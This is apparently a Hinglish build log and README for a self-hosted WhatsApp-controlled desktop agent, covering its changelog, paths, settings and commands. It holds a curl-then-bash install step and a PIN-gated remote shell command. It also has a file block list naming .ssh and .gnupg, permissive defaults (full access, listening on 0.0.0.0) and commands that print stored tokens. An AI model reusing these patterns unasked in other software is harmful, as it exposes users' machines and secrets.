aadhe se zyada words match karein. `vs code` / `code` / `app` waise hi kaam
karte hain; `definitely-not-an-app-xyz` ab "couldn't find an app" deta hai.

```js
const hits = qTokens.filter((t) => t.length >= 3 && nameTokens.some((n) => n === t || n.startsWith(t)));
if (hits.length && qTokens.length <= 3 && hits.length >= Math.ceil(qTokens.length / 2)) score = 20;
```

Regression test: fake list me "Observer App" daal ke `definitely-not-an-app-xyz`
→ `null`, `not a real app please` → `null`, par `app` → Observer App.

---

## 2.5.1 — test output that names the failure (aur desktop tests hermetic)

Owner ne `observer.sh test` chalaya: 88/90 pass, do fail — par script ne sirf
`tail -15` dikhaya, jisme failing test ke naam hi nahi the. Aur poora run 43
second le raha tha (sandbox me 2.4 s).

**Root cause (do cheezein):**

1. `cmd_test` failure par output ka last 15 line print karta tha — TAP me fail
   ka block upar hota hai. Ab har `not ok` ka **naam + assertion** dikhta hai,
   aur poora log `~/.cache/observer-agent/last-test.log` me rehta hai.
2. Tests **asli desktop** ko chhoo rahe the. `captureScreenshot()` Wayland pe
   pehle `xdg-desktop-portal` try karta hai; asli GNOME session me portal
   available hota hai, to test jisme `grim` ka black-frame shim check hota hai
   wo portal path pe chala jata hai (dialog + ~20 s wait) aur fail ho jata hai.
   Wahi `doctor` test bhi 20 s tak atakta tha → poora suite 43 s.
   Fix: test process me `DBUS_SESSION_BUS_ADDRESS` ek dead socket pe set —
   portal genuinely unavailable, jaisa test maanta hai. Production code same.

Verify:

```bash
./scripts/observer.sh test --live    # ab failing test ka naam + error dikhta hai
npm test                             # 90 pass, ~2.5s
```

---

## 2.5 — `observer.sh test` (ek command me poora verification)

Owner ne poocha "ab batao kaise test karun". Do jagah dekhna padta tha (`npm
test` terminal me, `/model` WhatsApp pe, `doctor` phir terminal me) — aur keys /
routing ka asli test kahin nahi tha. Ab:

```bash
bash observer.sh test --live
```

| Check | Kaise |
|---|---|
| Version (local vs remote) | `package.json` + GitHub |
| Node 20+, dependencies | `node -v`, `node_modules` |
| `.env` + kaunsi keys set hain (masked) | `.env` scan |
| Local model server / Ollama | `curl /v1/models`, `/api/tags` |
| systemd service | `systemctl --user is-active` |
| Unit tests | `npm test` (90) |
| **Routing preview** | asli `router.plan()` — tiny/light/standard/heavy/vision |
| **Asli API call** (`--live`) | `ai.complete()` — kaunsa brain, kaunsa model, kitne ms |

Sab tab-separated Node script se aata hai jo install ke andar chalta hai, isliye
wahi `.env` aur wahi config use hoti hai jo agent use karta hai. `--fast` unit
tests skip karta hai; `--live` ek chhota real call karta hai.

Bug jo testing me mila: `--live` fail hone pe script exit code 4 deta tha aur
shell use "routing preview could not run" samajh ke **duplicate warning** deta
tha. Fix: exit 3 = config error, exit 4 = live fail (dono ka apna message),
baaki = asli crash.

---

## 2.4 — free cloud keys (Groq + OpenRouter), vision, `keys` command

Owner: "how to add groq api in this code and if openrouter is also good for this work".

**Jo mila (asli bug):** Groq/OpenRouter ka support 2.0 se code me tha
(`GROQ_API_KEY`, `OPENROUTER_API_KEY`, router catalogue, `/model`), **lekin
defaults purane the.** Groq ne **16 Aug 2026** ko Llama 3.1 8B aur 3.3 70B free
tier se hata diya (enterprise-only), aur code unhi IDs pe tha — matlab nayi free
key daalne pe har call 404/`model_decommissioned` hoti.

**Fix + naye features:**

| Cheez | Kahan |
|---|---|
| Groq defaults: `openai/gpt-oss-120b` (big), `openai/gpt-oss-20b` (small), `qwen/qwen3.8-27b` (vision) | `src/config.js`, `.env.example` |
| OpenRouter default: `google/gemma-4-31b-it:free` (free, vision, tools, 262K) | `src/config.js`, `src/router.js` |
| Groq/OpenRouter **vision** (OpenAI `image_url` data URL) | `src/ai.js` (`visionCall`) |
| `GROQ_VISION_MODEL` / `OPENROUTER_VISION_MODEL`, `*_BASE_URL` overrides | `src/config.js` |
| `observer.sh keys` — add/test/remove keys, masked, verifies + restarts | `scripts/observer.sh` |
| Guide: limits, models, kaunsa lena chahiye | `AI-KEYS.md` |
| Tests: defaults, chat, vision parts, failover, tool loop | `test/cloud.test.js` (12) |

**2.4.1 fix:** update `.env` ko chhodta hai (sahi baat), par purane install me
`GROQ_MODEL=llama-3.3-70b-versatile` pada reh jata tha — nayi key ke saath bhi
har call 404. Ab `update` aur `keys` dono stale Groq Llama IDs detect karke
`gpt-oss` pe migrate kar dete hain (output me warning ke saath), taaki key
daalte hi kaam kare.

**Kyun Groq primary:** 1,000 requests/day per model, ~500 tok/sec, tool
calling, free Whisper voice notes, aur ek hi free vision model.
**OpenRouter:** 50/day (1,000 after one-time $10), 20+ free models — backup ke
liye best, primary nahi.

Verify:

```bash
./scripts/observer.sh keys            # kya set hai (masked)
./scripts/observer.sh keys --test     # 200 = key sahi
npm test                              # 90 pass
```

---

## 0. Ek nazar me (timeline)

| # | Commit | Kya hua | Tests | Tools |
|---|---|---|---|---|
| 1 | `b6faa21` | 2.0 base: phone app (PWA), Hinglish intents, action registry, AI tool-calling, OCR, voice, files | 31 | 57 |
| 2 | `88fc745` | Ghar se bahar: Tailscale helper (`setup-remote.sh`) | 31 | 57 |
| 3 | `8ac6d35` | `QUICKSTART.md` — exact run steps | 31 | 57 |
| 4 | `2257df3` | **Wayland fixes**: black screenshot detection, portal capture, ydotool diagnostics, `/doctor`, `fix-desktop.sh` | 36 | 60 |
| 5 | `4bbf6bc` | `update-from-github.sh` — **git ke bina update** | 36 | 60 |
| 6 | `8e2d3f8` | `install-fresh.sh` — **git ke bina pehli install** | 36 | 60 |
| 7 | `ef6f5b4` | Download fallback (`api.github.com`) jab `raw.githubusercontent.com` block ho | 36 | 60 |
| 8 | `88767c8` | **Portal D-Bus interface naam ka bug** — screenshot ka black/error root cause | 39 | 60 |
| 9 | `4314fd8` | **Screenshot banti thi par chat me nahi aati** — signal + file watch | 41 | 60 |
| 10 | `bff22b0` | **500-character typing limit hata diya** + `/pc paste` | 44 | 61 |
| 11 | *2.1* | **`/agent` fix** (verified steps, no fake "done") + **workload routing** (`/brains`) | 69 | 61 |
| 12 | *2.2* | **100% local**: Hugging Face GGUF + llama.cpp provider, `local-models.sh` (download/serve/wire/systemd) | 78 | 61 |
| 13 | *2.3* | **Ek hi script**: `observer.sh` — install/update/models/doctor/service/start/relink/remote/fix; purane scripts wrappers | 78 | 61 |
| 14 | *2.4* | **Free cloud keys**: Groq gpt-oss defaults (Llama free tier se gaya), OpenRouter Gemma 4, cloud vision, `observer.sh keys` | 90 | 61 |
| 15 | *2.5* | **`observer.sh test`**: keys, brains, routing preview, asli API call (`--live`), unit tests — ek command | 90 | 61 |
| 16 | *2.5.1* | **Test report fix**: failing test ka naam + log path; tests asli portal ko touch nahi karte (dead D-Bus) — 43s → 2.5s | 90 | 61 |
| 17 | *2.5.2* | **`/open` fuzzy-match bug**: bakwaas phrase se asli app khul jati thi (`app` → Observer App) | 90 | 61 |
| 18 | *2.5.3* | **Security review**: write-path block-list bypass, TTS shell injection, non-constant-time token | 93 | 61 |
| 19 | *2.5.4* | **`/arena` false failure**: page khulne ke baad bhi "page load nahi hua" — verification ab 3-value (proved / unverified / failed), chat sites pe seedha type + Enter | 98 | 61 |
| 20 | *2.6.0* | **Hands** (Agent-S zip se): screenshot→OCR word-id→ek click/type→dobara screenshot; stuck detection, 8-step budget, cloud-screen toggle | 118 | 62 |
| 21 | *2.7.0* | **`/stop`** (stacked kaam bhi turant rukta hai, partial steps batata hai), **screen vision** (OCR nahi — screenshot seedha Gemini/Groq/local vision model ko, 1024px JPEG), **update message** WhatsApp pe (kya naya + kitna time laga) | 142 | 62 |
| 22 | *2.8.0* | **Trust + reach**: `/undo` (file ops wapas), `/watch` (screen condition → alert), `/usage` (quota + 80% warning), `/teach` (record → replay), `/brief` (din ki tasveer + 9am schedule), `/resume`, live progress, photo diagnosis, **phone app Screen tab** (live + tap-to-click, Wi-Fi ya Tailscale se kahin se bhi), `observer.sh autoupdate` | 169 | 62 |
| 23 | *2.8.1* | **Screen on-demand**: koi 1s/5s/10s polling nahi (screenshot sirf Refresh/tab/action pe), tap pe 0 extra capture, ETag 304, aur Screen tab me **Commands console** (sab commands wahin) | 172 | 62 |
| 24 | *2.8.2* | **Screenshot auto-delete**: har capture 4 min baad khud saaf (2–5 min configurable), temp copy turant, portal ki ~/Pictures file bhi, `/shots` + `/shots clean`; sirf agent ke screenshots, tumhari files kabhi nahi | 182 | 62 |

Verify karna ho (sab curl, git zero):

```bash
cd ~/observer-agent
./scripts/observer.sh update --check      # local vs remote version
./scripts/observer.sh doctor              # kya theek hai, kya nahi
npm test                                  # 89 pass
npm run check                             # saari files ka syntax
```

---

## 0.1 Install/update sirf curl se (git nahi) — copy-paste

Yehi wo commands hain jo actually use hote hain. **Git kabhi nahi.**

**Pehli baar (fresh install, git ke bina):**

```bash
curl -fL -o /tmp/observer.sh \
  "https://raw.githubusercontent.com/pavit12301611/psd-observer/arena/5055bd15-psd-observer/whatsapp-agent/scripts/observer.sh" \
  || curl -fL -o /tmp/observer.sh -H "Accept: application/vnd.github.raw" \
  "https://api.github.com/repos/pavit12301611/psd-observer/contents/whatsapp-agent/scripts/observer.sh?ref=arena/5055bd15-psd-observer"

bash /tmp/observer.sh install --service --power --phone --model auto
```

**Update (baad me, code naya aane pe):**

```bash
curl -fL -o /tmp/observer.sh \
  "https://raw.githubusercontent.com/pavit12301611/psd-observer/arena/5055bd15-psd-observer/whatsapp-agent/scripts/observer.sh"
bash /tmp/observer.sh update --dir ~/observer-agent
```

**Version check:**

```bash
cd ~/observer-agent && ./scripts/observer.sh update --check
```

**Agar curl bhi block ho jaye** — pipe/`||` wali fallback line use karo, ya browser se zip:

```bash
# manual tarball
curl -fL -o /tmp/agent.tar.gz \
  "https://codeload.github.com/pavit12301611/psd-observer/tar.gz/refs/heads/arena/5055bd15-psd-observer"
tar -xzf /tmp/agent.tar.gz -C /tmp
```

```
https://github.com/pavit12301611/psd-observer/archive/refs/heads/arena/5055bd15-psd-observer.zip
```

Update scripts kya **nahi** chhoote: `.env`, `auth_info/` (WhatsApp login — QR
dobara nahi), `data/` (PIN, token, notes, reminders, todos, downloads).
Backup khud banta hai: `~/observer-agent-backup-<date>.tar.gz`.

---

## 0.2 EXACT LOCATIONS — kaunsi cheez kahan hai

Sab paths **default** hain (`observer.sh install` se kiya to yahi hain).
Apna install path pata karna ho:

```bash
find ~ -name package.json -path "*observer-agent*" -o -name package.json -path "*whatsapp-agent*" 2>/dev/null
```

### 0.2.1 Install folder aur code

| Kya | Exact path | Kya hai |
|---|---|---|
| **Agent ka root** | `~/observer-agent/` | Poora agent yahan. (Purane installs `~/psd-observer/whatsapp-agent/` me ho sakte hain.) |
| Entry point | `~/observer-agent/src/index.js` | `npm start` yahi chalata hai. Startup pe Desktop/PIN/URL print karta hai. |
| Code | `~/observer-agent/src/*.js` | 23 modules (table neeche). |
| Phone app (PWA) | `~/observer-agent/webapp/` | `index.html`, `app.js`, `styles.css`, `sw.js`, `manifest.webmanifest` |
| Scripts | `~/observer-agent/scripts/` | 7 shell scripts |
| systemd template | `~/observer-agent/systemd/observer-whatsapp-agent.service` | Installer iska copy banata hai |
| Tests | `~/observer-agent/test/agent.test.js`, `test/power.test.js` | `npm test` |
| Settings ka template | `~/observer-agent/.env.example` | Saare variables + comments |
| **Tumhari settings** | `~/observer-agent/.env` | Yahi edit karo. Update isse nahi chhoota. |
| Launcher | `~/observer-agent/start.sh` | Foreground run (systemd ke bina) |
| Docs | `~/observer-agent/README.md`, `QUICKSTART.md`, `BUILD-LOG.md` | |
| Root repo (agar git-clone style install hai) | `~/psd-observer/whatsapp-agent/` | Isi repo ka andar wala path — dono jagah same structure |

Agar update karte waqt `--dir` nahi diya, script khud dhoondh leta hai
(`src/` + `package.json` ki jagah).

### 0.2.2 Runtime data (tumhara asli data — backup lo)

| Kya | Exact path | Kis kaam ka |
|---|---|---|
| WhatsApp login | `~/observer-agent/auth_info/` | Baileys session. **Delete = QR dobara scan.** |
| Purana/dead login | `~/observer-agent/auth_info_loggedout_<date>/` | Auto-relink inhe archive karta hai (delete nahi). |
| Phone app **PIN** | `~/observer-agent/data/dashboard-pin.txt` | 6 digit, mode 600. `cat` karke dekh lo. |
| Bridge **token** | `~/observer-agent/data/bridge-token.txt` | App/API ka long token. Private rakho. |
| Settings + notes + todos + reminders + stats | `~/observer-agent/data/store.json` | JSON. Har change pe save. |
| Downloads | `~/observer-agent/data/downloads/` | WhatsApp se aayi files. |
| Shared | `~/observer-agent/data/shared/` | Yahan rakho → app ke Files tab me dikhega. |
| QR ka PNG | `~/observer-agent/data/qr.png` | Jab linking chal rahi ho. |
| Update backups | `~/observer-agent-backup-YYYYMMDD-HHMMSS.tar.gz` | `$HOME` me, code ka snapshot (`.env`/`data` nahi). |

> `DATA_DIR` / `AUTH_DIR` `.env` me set karke inhe kahin aur bhi rakh sakte ho
> (Fedora/XDG example `.env.example` ke end me comment hai).

### 0.2.3 System files (agent ke bahar)

| Kya | Exact path |
|---|---|
| systemd **user** unit | `~/.config/systemd/user/observer-whatsapp-agent.service` |
| Service logs | `journalctl --user -u observer-whatsapp-agent` |
| Linger (boot pe start) | `loginctl enable-linger "$USER"` |
| Ollama service | `systemctl status ollama` · API `http://127.0.0.1:11434` |
| Ollama models | `~/.ollama/models/` (`ollama list`) |
| Portal (screenshot) | `systemctl --user status xdg-desktop-portal-gnome` / `xdg-desktop-portal` |
| ydotool daemon | `systemctl status ydotool` (kabhi `ydotoold`) · socket `/tmp/.ydotool_socket` ya `/run/ydotoold/socket` |
| uinput device | `/dev/uinput` |
| GNOME screenshots | `~/Pictures/` (ya `XDG_PICTURES_DIR`, naam `user-dirs.dirs` se) |
| Wayland sockets | `/run/user/$(id -u)/wayland-*` |
| X11 sockets | `/tmp/.X11-unix/X*` |
| Agent ke temp shots | `/tmp/observer-shot-<ms>.png` (bhejne ke baad delete) |

### 0.2.4 Kaunsa code kis file me (debug karte waqt)

| Function / feature | File | Line (is commit pe; badal sakti hai — `grep -n` use karo) |
|---|---|---|
| Session/socket detection | `src/pccontrol.js` | `detectSockets()` 36, `displayEnv()` 62, `sessionInfo()` 84 |
| **Screenshot** (portal → grim → spectacle, black check) | `src/pccontrol.js` | `captureScreenshot()` 499, `screenshotAttempts()` 451, `portalScreenshot()` 370 |
| Portal response parse | `src/pccontrol.js` | `parsePortalScreenshotResponse()` 250 |
| Screenshot **file watcher** | `src/pccontrol.js` | `picturesDirs()` 272, `findNewScreenshot()` 289, `waitForCompleteFile()` 311 |
| Black image detect | `src/imaging.js` | `decodePng()` 30, `imageStats()` 116 |
| Keyboard / mouse | `src/pccontrol.js` | `splitForTyping()` 745, `typeText()` 764, `pasteText()` 791, `keyCombo()` ~815, `click()` ~825, `moveMouse()` ~860, `scrollMouse()` ~880 |
| Input diagnostics | `src/pccontrol.js` | `ydotoolSocket()` 674, `inputDiagnostics()` 683 |
| Volume / brightness / media | `src/pccontrol.js` | `volume()` 546, `brightness()` ~600, `media()` ~625 |
| File tools | `src/files.js` | `smartHomePath()` 53, `resolvePath()` 84, `fileReply()` 205, `movePath()`/`copyPath()`/`makeDir()` ~290 |
| Hinglish intents | `src/nlp.js` | `parseIntent()` 31 |
| Action registry (61) | `src/actions.js` | `registry` array 57, `toolSchemas()` 623, `accessReport()` 643, `execute()` 662, `runPending()` 699 |
| AI tool-calling | `src/agentloop.js` | `createAgentLoop()` 43, `toolsFor()` 55, `run()` 211 |
| AI providers | `src/ai.js` | `complete()`, `describeImage()`, `aiStatus()` |
| `/doctor` | `src/doctor.js` | `runDoctor()` 81 |
| Command router | `src/commands.js` | `createAgent()` 62, `handleCommand()` 400, `HELP` ~26 |
| Phone app API + PWA hosting | `src/server.js` | `createBridgeServer()` 90, static + routes ~150-380 |
| WhatsApp link/send | `src/whatsapp.js` | `createWhatsApp()` 98, `start()` ~355, `processOwnerMessage()` ~200, `runOwner()` ~528 |
| App discovery/launch | `src/apps.js` | `discoverApps()` 110, `matchApp()` 136, `launchApp()` 192 |
| Wi-Fi/BT/services/record | `src/systemx.js` | poore file me feature-wise |
| OCR / PDF | `src/ocr.js` | `ocrImage()` 37, `ocrScreen()` 55, `lookAtScreen()` 111 |
| Voice notes | `src/transcribe.js` | `transcribeAudio()` 77 |
| Settings load | `src/config.js` | `loadConfig()` 75; PIN `resolveDashboardPin()` 60; token `resolveBridgeToken()` 40 |
| Reminders/todos/store | `src/store.js` | `Store`, `startReminderLoop()` |

### 0.2.5 Settings kis line pe (`.env`)

| Setting | Exact jagah (`.env.example` line) | Default |
|---|---|---|
| Owner / agent number | line 8 `OWNER_NUMBER`, line 12 `AGENT_NUMBER` | `919528923866` / `918859555795` |
| Phone app | line 37 `HOST`, 38 `PORT`, 41 `BRIDGE_TOKEN`, 44 `DASHBOARD_PIN` | `0.0.0.0`, `8787`, auto, auto |
| AI | line 48 `AI_PROVIDER`, `OLLAMA_URL`, `OLLAMA_MODEL`, `OLLAMA_VISION_MODEL`, `GROQ_*`, `GEMINI_*`, `OPENROUTER_*` | auto / llama3.2 |
| Access | line 73 `ACCESS_LEVEL`, `FILES_EXTRA_ROOTS`, `CONFIRM_TTL_MS` | `full`, —, 120000 |
| AI tools | `AGENT_TOOLS`, `MAX_AGENT_STEPS`, `AGENT_TOOL_LIMIT`, `OLLAMA_NUM_CTX` | true, 6, 20, 8192 |
| Typing | line 93 `TYPE_CHUNK_CHARS`, line 94 `TYPE_CHUNK_DELAY_MS` | 180, 60 |
| Screenshot | line 98 `PORTAL_TIMEOUT_MS` | 60000 |
| OCR / voice | `OCR_LANGS`, `WHISPER_*` | `eng`, — |
| Shell | `ALLOW_SHELL`, `SHELL_PIN`, `SHELL_TIMEOUT_MS` | false, —, 20000 |
| PC input | line 131 `ALLOW_PC_CONTROL`, `CONTROL_PIN`, `YDOTOOL_SOCKET` | true, —, auto |
| Misc | `TIMEZONE`, `ALLOW_SIMULATE`, `DATA_DIR`, `AUTH_DIR` | Asia/Kolkata, false, `data`, `auth_info` |

Sabse zyada edit hone wali 6 cheezein:

| Karna hai | File + variable |
|---|---|
| AI model badalna | `~/observer-agent/.env` → `OLLAMA_MODEL=llama3.2` (ya `qwen2.5:7b`) |
| Screenshot prompt ka wait badhana | `.env` → `PORTAL_TIMEOUT_MS=120000` |
| Typing tez/kam karna | `.env` → `TYPE_CHUNK_CHARS`, `TYPE_CHUNK_DELAY_MS` |
| Shell on karna | `.env` → `ALLOW_SHELL=true` + `SHELL_PIN=1234` |
| Access kam karna | `.env` → `ACCESS_LEVEL=standard` (ya `safe`) |
| Phone app ka PIN badalna | `.env` → `DASHBOARD_PIN=123456` (ya `data/dashboard-pin.txt` delete karke restart) |

Exact line numbers badal sakte hain — dhoondhne ke liye:

```bash
cd ~/observer-agent
grep -n "^ACCESS_LEVEL\|^PORTAL_TIMEOUT_MS\|^TYPE_CHUNK" .env
grep -n "PORTAL_TIMEOUT_MS\|TYPE_CHUNK" .env.example
```

### 0.2.6 Scripts — exact command aur wo kya chhoote hain

| Script | Path | Chalane ka tarika | Safe rakhta hai |
|---|---|---|---|
| Fresh install | `~/observer-agent/scripts/install-fresh.sh` | `bash /tmp/observer-setup.sh --service --ollama --power --phone` | — (naya install) |
| Update | `~/observer-agent/scripts/update-from-github.sh` | `./scripts/update-from-github.sh --dir ~/observer-agent` | `.env`, `auth_info/`, `data/` |
| Installer | `~/observer-agent/scripts/install-fedora.sh` | `./scripts/install-fedora.sh --service --ollama --power --phone` | `.env`, `data/` |
| systemd | `~/observer-agent/scripts/install-systemd.sh` | `./scripts/install-systemd.sh` / `--uninstall` | `data/`, `auth_info/` |
| Desktop repair | `~/observer-agent/scripts/fix-desktop.sh` | `./scripts/fix-desktop.sh` | kuch delete nahi |
| Remote (Tailscale) | `~/observer-agent/scripts/setup-remote.sh` | `./scripts/setup-remote.sh` | `.env` me sirf `HOST` |
| Relink QR | `~/observer-agent/scripts/relink-whatsapp.sh` | `./scripts/relink-whatsapp.sh` | `data/` (login archive hota hai) |

### 0.2.7 Logs aur quick health checks — exact

```bash
# service
systemctl --user status observer-whatsapp-agent
journalctl --user -u observer-whatsapp-agent -n 100 --no-pager
journalctl --user -u observer-whatsapp-agent -f

# health + PIN + token
curl -s http://127.0.0.1:8787/health
cat ~/observer-agent/data/dashboard-pin.txt
cat ~/observer-agent/data/bridge-token.txt

# screenshot path (Wayland)
gdbus introspect --session --dest org.freedesktop.portal.Desktop \
  --object-path /org/freedesktop/portal/desktop | grep -i screenshot
systemctl --user status xdg-desktop-portal-gnome

# input path
systemctl status ydotool; ls -l /dev/uinput /tmp/.ydotool_socket

# AI
curl -s http://127.0.0.1:11434/api/tags | head -c 200
```

Aur sab kuch ek saath: WhatsApp pe **`/doctor`**.

---

## 1. Naya kya bana — file by file

### 1.1 Naye modules (`whatsapp-agent/src/`)

| File | Kya karta hai | Kaise |
|---|---|---|
| `actions.js` | **61 actions ka ek hi registry** — apps, files, input, network, power, lookups. Har action ka level (`safe`/`standard`/`full`) aur `destructive` flag. | Commands, offline intents aur AI — teeno yahi registry use karte hain, isliye permission/confirmation ek jagah lagti hai. Destructive actions `store.data.pending` me park hoti hain aur `haan`/`yes` se chalti hain (2 min TTL). |
| `nlp.js` | Offline Hinglish/English intent parser | Pure function: "chrome kholo" → `{cmd:'open', args:'chrome'}`. AI ke bina bhi kaam karta hai. |
| `agentloop.js` | Free AI **tool-calling loop** (multi-step) | Ollama / Groq / Gemini / OpenRouter adapters. 61 tools me se sirf top ~20 relevant bhejta hai (chhote models ka context bachane ke liye), `num_ctx=8192`. |
| `apps.js` | Koi bhi `.desktop` app kholna/band karna, window list/focus | `.desktop` files parse (`Exec=` quoting, `%U` field codes), aur launch sirf **argv array** se — shell string kabhi nahi. |
| `files.js` | Files: list/read/write/search/zip/unzip/download/move/copy/mkdir/delete | Sab kuch `$HOME` ke andar (plus `FILES_EXTRA_ROOTS`), `realpath` check, `.ssh`/`.gnupg`/`auth_info` blocked. |
| `systemx.js` | Wi-Fi (nmcli), Bluetooth, systemd services, processes, webcam, screen recording | Har failure me exact `dnf install` package ka naam. |
| `ocr.js` | Screenshot/photo ka text (tesseract), PDF/DOCX padhna, `/look` | `pdftotext` → text; phir AI se jawab. |
| `transcribe.js` | Voice note → text | Groq Whisper (free tier) ya local `whisper.cpp`. Transcript ko normal message ki tarah process karta hai (matlab voice se command bhi chal sakta hai). |
| `imaging.js` | **Black/blank screenshot detect karna** | Zero-dependency PNG decoder (zlib + filters), luminance se mean/max/distinct colour. `mean < 5 && max < 18` → blank. |
| `doctor.js` | `/doctor` — self-check | Asli screenshot, pixels, input tools, packages, AI, access — har fail ke saath fix command. |
| `webapp.js` | PWA icons (192/512 PNG) generate karna | Hand-rolled PNG encoder (CRC32 + zlib), koi image library nahi. |

### 1.2 Phone app (`whatsapp-agent/webapp/`)

| File | Kya |
|---|---|
| `index.html` | 4 tabs: Chat, Panel, Files, Settings; PIN login screen |
| `app.js` | Chat + localStorage history, quick control grid, files list, QR, install prompt, mic (browser dictation) |
| `styles.css` | WhatsApp-jaisa dark theme, mobile-first |
| `sw.js` | Service worker — shell offline cache (API calls network se) |
| `manifest.webmanifest` | Installable PWA (standalone, icons, theme colour) |

Server (`src/server.js`) inhe serve karta hai: `/`, `/styles.css`, `/app.js`,
`/sw.js`, `/manifest.webmanifest`, `/icon-192.png`, `/icon-512.png`, plus
`/dashboard` → `/` redirect.

### 1.3 Scripts

| Script | Kya | Example |
|---|---|---|
| `install-fresh.sh` | **Pehli install, git ke bina** — tarball download → extract → `.env` → installer | `bash /tmp/observer-setup.sh --service --ollama --power --phone` |
| `update-from-github.sh` | **Update, git ke bina** — backup → sirf code replace → `npm install` → restart | `./scripts/update-from-github.sh --dir ~/observer-agent` |
| `fix-desktop.sh` | Screenshot/input repair: portal backend, grim, ydotool daemon, `/dev/uinput`, portal verify | `./scripts/fix-desktop.sh` |
| `setup-remote.sh` | Ghar se bahar: Tailscale install + login + firewall + URL/PIN print | `./scripts/setup-remote.sh` |
| `install-fedora.sh` | Main installer, ab `--power`/`--phone`/`--remote` ke saath | `./scripts/install-fedora.sh --service --ollama --power --phone` |

### 1.4 Docs

`README.md` (agent), `QUICKSTART.md` (exact steps), `../FEDORA.md` (distro
specifics), `../FREE_WHATSAPP.md` (poora scene), `../STRUCTURE.md` (map), aur
yahi `BUILD-LOG.md`.

---

## 2. Features aur unki command

### 2.1 Apps & windows
```
/apps                         installed apps
/open <app>                   koi bhi app (chrome, vs code, spotify…)
/close <app>                  band karo (confirmation ke saath)
/windows                      open windows
/focus <title>                window focus
```
Hinglish: `chrome kholo`, `notepad band karo`, `spotify kholo`.

### 2.2 Screen
```
/screenshot                   screen → WhatsApp
/look [question]              screenshot + OCR + free AI answer
/ocr                          sirf text
/record [seconds]             screen recording (mp4)
/webcam                       webcam photo
```
Hinglish: `screenshot bhej do`, `screen pe kya hai`, `10 second record karo`.

### 2.3 Input (keyboard/mouse)
```
/pc type <text>               type (ab koi limit nahi — chunks me)
/pc paste <text>              clipboard + Ctrl+V (long/multi-line ke liye best)
/pc key ctrl+l                koi bhi key combo
/pc click <x> <y> [double]    click
/pc tap <label>               OCR se button dhoondh ke click
/pc mousemove <x> <y>         pointer move
/pc scroll [up|down] [n]      wheel scroll
/pc lock                      screen lock
```

### 2.4 Files
```
/ls [path]                    folder list
/read <path>                  text padho
/write <path> | <text>        likho (--append bhi)
/send <path>                  WhatsApp pe bhejo
/find <name>                  home me search
/mv <from> | <to>             move/rename
/cp <from> | <to>             copy
/mkdir <folder>               naya folder
/zip <path> · /unzip <file>   archive
/download <url> [path]        internet se download
/rm <path>                    delete (confirmation)
```
Hinglish: `file banao ~/a.txt me hello`, `notes.txt padho`, `report.pdf bhejo`,
`downloads me kya hai`, `purana.txt hata do`.

### 2.5 Network / system
```
/wifi [status|on|off|list] · /wifi connect <SSID> [pass]
/bt [status|on|off] · /svc status|restart <service> · /kill <process>
/pc status|disk|ip|battery|top|notify <text>
/pc volume up|down|mute|50 · /pc brightness 70 · /pc media play|next
```

### 2.6 Free lookups (koi key nahi)
```
/weather <city> · /wiki <topic> · /news · /calc 45*12 · /url <link>
/qr <text> · /password [n] · /uuid · /shorten <url> · /choose a, b, c
```

### 2.7 Productivity
```
/remind in 10m <text> · /reminders · /todo add <text> · /todo done <id>
/note <text> · /remember <fact> · /memory
```

### 2.8 AI aur control
```
/agent <task>                 multi-step task (free AI)
/model                        kaunsa AI brain chal raha hai
/doctor                       kya toota hai + exact fix
/access                       kya allowed hai
/yes · /no                    destructive confirmation
/run <PIN> <cmd>              shell (sirf ALLOW_SHELL=true + PIN)
```

### 2.9 Scripts ki command
```bash
./scripts/install-fedora.sh --service --ollama --power --phone   # install
./scripts/fix-desktop.sh                                          # wayland repair
./scripts/setup-remote.sh                                         # tailscale
./scripts/update-from-github.sh --dir ~/observer-agent            # update (no git)
./scripts/update-from-github.sh --check                           # version check
./scripts/relink-whatsapp.sh                                      # QR dobara
./scripts/install-systemd.sh --uninstall                          # autostart hatao
```

### 2.10 Rozmarra ki debugging
```bash
systemctl --user status observer-whatsapp-agent
systemctl --user restart observer-whatsapp-agent
journalctl --user -u observer-whatsapp-agent -n 100 --no-pager
curl -s localhost:8787/health
gdbus introspect --session --dest org.freedesktop.portal.Desktop \
  --object-path /org/freedesktop/portal/desktop | grep -i screenshot
systemctl --user status xdg-desktop-portal-gnome
systemctl status ydotool
ls -l /dev/uinput /tmp/.ydotool_socket
```

---

## 3. Error log — jo asli machine pe aaya, aur fix

### 3.1 Screenshot

#### ❌ `No such interface "org.freedesktop.portal.Desktop.Screenshot" on object at path`
- **Kya hua:** screenshot ka request portal ko galat D-Bus interface naam se gaya.
  Maine `<dest>.Screenshot.Screenshot` bheja → `org.freedesktop.portal.Desktop.Screenshot.Screenshot`.
- **Asli interface:** `org.freedesktop.portal.Screenshot.Screenshot`
  (`org.freedesktop.portal.Desktop` sirf *bus name* hai, interface nahi).
- **Fix (`88767c8`):** `PORTAL_SCREENSHOT_IFACE = 'org.freedesktop.portal.Screenshot'`.
  Regression test: file me purana spelling dobara na aaye.
- **Verify:**
  ```bash
  gdbus introspect --session --dest org.freedesktop.portal.Desktop \
    --object-path /org/freedesktop/portal/desktop | grep -i screenshot
  # → interface org.freedesktop.portal.Screenshot { … }
  ```

#### ❌ `grim: compositor doesn't support the screen capture protocol`
- **Kyun:** `grim` sirf wlroots compositors (Sway/Hyprland) pe chalta hai, GNOME pe nahi.
- **Fix:** GNOME pe portal pehle try hota hai; grim ab sirf fallback.

#### ❌ `scrot: returned a black image (1920×1200)`
- **Kyun:** Wayland X11 tools ko capture karne deta hai par **kaali image** deta hai — exit code 0.
- **Fix (`2257df3`):** `imaging.js` har capture ko decode karke brightness naapta hai;
  blank = failure, owner ko bhejta hi nahi.

#### ❌ `import: missing an image filename /tmp/observer-shot-….png`
- **Kyun:** ImageMagick ka `import` sun-synopsis alag hai; `-window root <file>` ka order chal nahi raha tha.
- **Fix:** Wayland pe `import`/`maim`/`scrot` try hi nahi karta (bekaar + confusing error).

#### ❌ Screenshot banti hai, "Allow" bhi kar diya, par chat me nahi aati (timeout)
- **Do root cause:**
  1. `gdbus monitor --dest org.freedesktop.portal.Desktop` — portal D-Bus se
     **on-demand start** hota hai, isliye jab hamari call usse jagati hai to
     monitor ka destination filter match nahi karta. Response signal miss.
  2. Result ka sirf ek hi raasta tha (wahi signal). File `~/Pictures/` me padi rehti thi.
- **Fix (`4314fd8`):**
  - Monitor ab **poora session bus** dekhta hai (`gdbus monitor --session`), filter parser me.
  - **Pictures folder watch** (`XDG_PICTURES_DIR`, `~/Pictures`, `~/Pictures/Screenshots`,
    localized naam `user-dirs.dirs` se) — portal jo PNG likhta hai, wahi utha liya jata hai.
